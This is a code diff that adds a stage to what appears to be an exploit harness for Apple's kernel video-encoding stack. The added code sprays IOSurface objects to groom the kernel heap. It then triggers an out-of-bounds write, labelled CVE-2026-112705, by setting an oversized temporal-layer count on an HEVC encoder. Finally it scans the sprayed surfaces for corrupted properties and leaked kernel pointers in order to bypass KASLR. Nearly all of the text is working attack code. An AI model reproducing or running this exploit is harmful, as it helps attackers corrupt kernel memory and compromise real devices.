@@ -25998,6 +25998,252 @@ new_modes:
             rlog("--- Phase 23 complete ---\n");
         }
 
+        /* ============================================================
+         * Phase 24: CVE-2026-112705 OOB write + IOSurface heap spray
+         *           for KASLR bypass
+         *
+         * Strategy: spray IOSurface objects to fill the heap, then
+         * create a VT session whose temporal layers array lands
+         * adjacent to IOSurface kernel objects. The OOB write from
+         * encoding with TL>8 corrupts adjacent memory, potentially
+         * overwriting IOSurface fields with data we can read back
+         * via IOSurfaceCopyValue. If the write corrupts pointer
+         * fields, we leak kernel addresses.
+         * ============================================================ */
+        if (rounds == 229) {
+            rlog("\n=== Phase 24: CVE-2026-112705 + heap spray KASLR leak ===\n");
+
+            /* 24a: Heap grooming — create IOSurface objects to fill
+             * adjacent heap slots around where VT session data lands */
+            rlog("\n--- 24a: IOSurface heap spray pre-VT session ---\n");
+            {
+                #define P24_SPRAY_COUNT 128
+                #define P24_PROBE_KEYS 8
+                static IOSurfaceRef p24_surfs[P24_SPRAY_COUNT];
+                int p24_created = 0;
+
+                /* Create spray surfaces with known marker values */
+                for (int i = 0; i < P24_SPRAY_COUNT; i++) {
+                    int sw = 64, sh = 64, sbpe = 4, spf = 0x42475241;
+                    CFNumberRef sw_n = CFNumberCreate(NULL, kCFNumberIntType, &sw);
+                    CFNumberRef sh_n = CFNumberCreate(NULL, kCFNumberIntType, &sh);
+                    CFNumberRef sbpe_n = CFNumberCreate(NULL, kCFNumberIntType, &sbpe);
+                    CFNumberRef spf_n = CFNumberCreate(NULL, kCFNumberIntType, &spf);
+                    CFStringRef sk[] = {
+                        CFSTR("IOSurfaceWidth"), CFSTR("IOSurfaceHeight"),
+                        CFSTR("IOSurfaceBytesPerElement"), CFSTR("IOSurfacePixelFormat")
+                    };
+                    CFTypeRef sv[] = { sw_n, sh_n, sbpe_n, spf_n };
+                    CFDictionaryRef sp = CFDictionaryCreate(NULL,
+                        (const void **)sk, (const void **)sv, 4,
+                        &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+
+                    p24_surfs[i] = IOSurfaceCreate(sp);
+                    CFRelease(sp); CFRelease(sw_n); CFRelease(sh_n);
+                    CFRelease(sbpe_n); CFRelease(spf_n);
+
+                    if (p24_surfs[i]) {
+                        p24_created++;
+                        /* Store a marker property to detect corruption */
+                        int64_t marker = 0xDEAD000000000000LL | (int64_t)i;
+                        CFNumberRef mv = CFNumberCreate(NULL,
+                            kCFNumberSInt64Type, &marker);
+                        IOSurfaceSetValue(p24_surfs[i], CFSTR("Marker"), mv);
+                        CFRelease(mv);
+                    }
+                }
+                rlog("  Created %d spray IOSurfaces\n", p24_created);
+
+                /* 24b: Record baseline property values before OOB write */
+                rlog("\n--- 24b: Baseline property snapshot ---\n");
+                const char *p24_keys[] = {
+                    "IOSurfaceAllocSize", "IOSurfaceBytesPerRow",
+                    "IOSurfaceWidth", "IOSurfaceHeight",
+                    "IOSurfacePixelFormat", "IOSurfaceBytesPerElement",
+                    "IOSurfaceOffset", "Marker"
+                };
+                int64_t p24_baseline[P24_SPRAY_COUNT][P24_PROBE_KEYS];
+                memset(p24_baseline, 0, sizeof(p24_baseline));
+
+                for (int i = 0; i < P24_SPRAY_COUNT; i++) {
+                    if (!p24_surfs[i]) continue;
+                    for (int k = 0; k < P24_PROBE_KEYS; k++) {
+                        CFStringRef ks = CFStringCreateWithCString(
+                            NULL, p24_keys[k], kCFStringEncodingUTF8);
+                        CFTypeRef val = IOSurfaceCopyValue(p24_surfs[i], ks);
+                        if (val && CFGetTypeID(val) == CFNumberGetTypeID()) {
+                            CFNumberGetValue(val, kCFNumberSInt64Type,
+                                &p24_baseline[i][k]);
+                        }
+                        if (val) CFRelease(val);
+                        CFRelease(ks);
+                    }
+                }
+                rlog("  Baseline recorded for %d surfaces x %d keys\n",
+                    p24_created, P24_PROBE_KEYS);
+
+                /* 24c: Create VT session and trigger OOB write */
+                rlog("\n--- 24c: Trigger CVE-2026-112705 OOB write ---\n");
+
+                /* Try multiple TL values — smaller overflows are more
+                 * likely to corrupt adjacent objects without killing
+                 * the kernel */
+                int p24_tl_vals[] = {16, 32, 64};
+                int p24_ntl = sizeof(p24_tl_vals) / sizeof(p24_tl_vals[0]);
+
+                for (int tli = 0; tli < p24_ntl; tli++) {
+                    int tl = p24_tl_vals[tli];
+                    rlog("  --- TL=%d OOB write ---\n", tl);
+
+                    VTCompressionSessionRef p24_s = NULL;
+                    CFMutableDictionaryRef p24_es = CFDictionaryCreateMutable(
+                        kCFAllocatorDefault, 0,
+                        &kCFTypeDictionaryKeyCallBacks,
+                        &kCFTypeDictionaryValueCallBacks);
+                    CFDictionarySetValue(p24_es,
+                        CFSTR("EnableHardwareAcceleratedVideoEncoder"),
+                        kCFBooleanTrue);
+                    OSStatus p24_cr = VTCompressionSessionCreate(
+                        kCFAllocatorDefault, 1920, 1080,
+                        kCMVideoCodecType_HEVC, p24_es, NULL, NULL,
+                        encode_cb, NULL, &p24_s);
+                    CFRelease(p24_es);
+                    if (p24_cr != noErr || !p24_s) {
+                        rlog("    Session fail: %d\n", (int)p24_cr);
+                        continue;
+                    }
+
+                    CFNumberRef p24_tln = CFNumberCreate(NULL,
+                        kCFNumberIntType, &tl);
+                    VTSessionSetProperty(p24_s,
+                        CFSTR("NumberOfTemporalLayers"), p24_tln);
+                    CFRelease(p24_tln);
+                    VTSessionSetProperty(p24_s,
+                        CFSTR("RealTime"), kCFBooleanTrue);
+                    VTSessionSetProperty(p24_s,
+                        CFSTR("AllowTemporalCompression"), kCFBooleanTrue);
+
+                    OSStatus p24_pr =
+                        VTCompressionSessionPrepareToEncodeFrames(p24_s);
+                    if (p24_pr != noErr) {
+                        rlog("    Prepare fail: %d\n", (int)p24_pr);
+                        VTCompressionSessionInvalidate(p24_s);
+                        CFRelease(p24_s);
+                        continue;
+                    }
+
+                    /* Encode exactly ONE frame */
+                    g_encode_done = 0;
+                    g_cb_status = -999;
+                    encode_one(p24_s, 0, 1920, 1080);
+                    for (int w = 0; w < 300 && !g_encode_done; w++)
+                        usleep(10000);
+                    rlog("    Frame0: cb=%d\n", (int)g_cb_status);
+
+                    VTCompressionSessionCompleteFrames(p24_s, kCMTimeInvalid);
+                    VTCompressionSessionInvalidate(p24_s);
+                    CFRelease(p24_s);
+
+                    /* 24d: Scan IOSurface properties for corruption */
+                    rlog("  --- Scanning for property corruption ---\n");
+                    int corrupted = 0;
+                    for (int i = 0; i < P24_SPRAY_COUNT; i++) {
+                        if (!p24_surfs[i]) continue;
+                        for (int k = 0; k < P24_PROBE_KEYS; k++) {
+                            CFStringRef ks = CFStringCreateWithCString(
+                                NULL, p24_keys[k], kCFStringEncodingUTF8);
+                            CFTypeRef val = IOSurfaceCopyValue(
+                                p24_surfs[i], ks);
+                            int64_t cur = 0;
+                            if (val && CFGetTypeID(val) == CFNumberGetTypeID())
+                                CFNumberGetValue(val, kCFNumberSInt64Type, &cur);
+                            if (val) CFRelease(val);
+                            CFRelease(ks);
+
+                            if (cur != p24_baseline[i][k]) {
+                                corrupted++;
+                                rlog("    *** CORRUPTION surf[%d].%s: "
+                                     "was=0x%llx now=0x%llx",
+                                    i, p24_keys[k],
+                                    (unsigned long long)p24_baseline[i][k],
+                                    (unsigned long long)cur);
+                                if (((uint64_t)cur >> 40) == 0xFFFFFE)
+                                    rlog(" *** KPTR LEAK ***");
+                                rlog(" ***\n");
+                                /* Update baseline for next round */
+                                p24_baseline[i][k] = cur;
+                            }
+                        }
+                    }
+                    rlog("    TL=%d: %d property corruptions detected\n",
+                        tl, corrupted);
+
+                    usleep(100000);
+                }
+
+                /* 24e: Also scan for new/unexpected properties on spray
+                 * surfaces — OOB write might have created dictionary
+                 * entries that look like property keys */
+                rlog("\n--- 24e: Probe for unexpected property values ---\n");
+                {
+                    const char *probe_extra[] = {
+                        "IOSurfaceAddress", "IOSurfacePlaneBase",
+                        "IOSurfacePlaneOffset", "IOSurfacePlaneSize",
+                        "IOSurfacePlaneBytesPerRow", "IOSurfacePlaneWidth",
+                        "IOSurfacePlaneHeight", "IOSurfacePlaneElementWidth",
+                        "IOSurfacePlaneElementHeight", "IOSurfaceCacheMode",
+                        NULL
+                    };
+                    int extra_found = 0;
+                    for (int i = 0; i < P24_SPRAY_COUNT; i++) {
+                        if (!p24_surfs[i]) continue;
+                        for (int k = 0; probe_extra[k]; k++) {
+                            CFStringRef ks = CFStringCreateWithCString(
+                                NULL, probe_extra[k], kCFStringEncodingUTF8);
+                            CFTypeRef val = IOSurfaceCopyValue(
+                                p24_surfs[i], ks);
+                            if (val) {
+                                if (CFGetTypeID(val) == CFNumberGetTypeID()) {
+                                    int64_t iv = 0;
+                                    CFNumberGetValue(val, kCFNumberSInt64Type, &iv);
+                                    if (iv != 0 && ((uint64_t)iv >> 40) == 0xFFFFFE) {
+                                        extra_found++;
+                                        rlog("  surf[%d].%s = 0x%llx *** KPTR ***\n",
+                                            i, probe_extra[k],
+                                            (unsigned long long)iv);
+                                    }
+                                } else if (CFGetTypeID(val) == CFDataGetTypeID()) {
+                                    CFDataRef d = (CFDataRef)val;
+                                    const uint8_t *db = CFDataGetBytePtr(d);
+                                    CFIndex dl = CFDataGetLength(d);
+                                    for (CFIndex qi = 0; qi + 7 < dl; qi += 8) {
+                                        uint64_t qv;
+                                        memcpy(&qv, db + qi, 8);
+                                        if ((qv >> 40) == 0xFFFFFE) {
+                                            extra_found++;
+                                            rlog("  surf[%d].%s data@%ld = 0x%llx *** KPTR ***\n",
+                                                i, probe_extra[k], (long)qi,
+                                                (unsigned long long)qv);
+                                        }
+                                    }
+                                }
+                                CFRelease(val);
+                            }
+                            CFRelease(ks);
+                        }
+                    }
+                    rlog("  Extra KPTR values found: %d\n", extra_found);
+                }
+
+                /* Cleanup */
+                for (int i = 0; i < P24_SPRAY_COUNT; i++) {
+                    if (p24_surfs[i]) CFRelease(p24_surfs[i]);
+                }
+
+                rlog("\n--- Phase 24 complete ---\n");
+            }
+        }
+
 
 
 
